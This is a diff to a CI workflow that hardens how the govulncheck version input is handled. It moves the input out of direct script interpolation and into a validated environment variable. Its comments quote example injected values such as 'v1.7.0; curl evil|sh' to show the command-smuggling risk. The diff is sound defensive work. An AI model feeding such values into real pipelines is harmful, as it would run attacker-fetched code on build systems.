@@ -142,7 +142,27 @@ jobs:
           # right for the scan (it must analyse under the pinned toolchain) and wrong for BUILDING
           # the scanner, so the override is scoped to this step alone.
           GOTOOLCHAIN: auto
-        run: go install golang.org/x/vuln/cmd/govulncheck@${{ inputs.govulncheck_version }}
+          # Never interpolated into the script body: `${{ }}` is substituted BEFORE the shell sees
+          # the line, so a caller passing `v1.7.0; curl evil|sh` would be running commands, not
+          # naming a version. As an env var it is data the shell expands, and the check below bounds
+          # it to a module query even if a caller forwards something untrusted into this input.
+          GOVULNCHECK_VERSION: ${{ inputs.govulncheck_version }}
+        run: |
+          # CHARSET FIRST, SHAPE SECOND, and in that order for a reason. A shape glob alone accepts
+          # "v1.7.0; curl evil | sh" — its trailing * swallows the payload — and `grep -E` matches
+          # LINE BY LINE, so a value whose first line is "v1.7.0" passes whatever follows the
+          # newline. `case` tests the whole string at once, so rejecting every character outside
+          # the module-query set closes both holes before the shape is considered.
+          case "$GOVULNCHECK_VERSION" in
+            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
+            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
+            *)                            bad=1 ;;
+          esac
+          if [ -n "$bad" ]; then
+            echo "::error::govulncheck_version must be 'latest' or a vX.Y.Z module query, got '$GOVULNCHECK_VERSION'"
+            exit 1
+          fi
+          go install "golang.org/x/vuln/cmd/govulncheck@$GOVULNCHECK_VERSION"
 
       - name: Run govulncheck
         run: govulncheck ./...
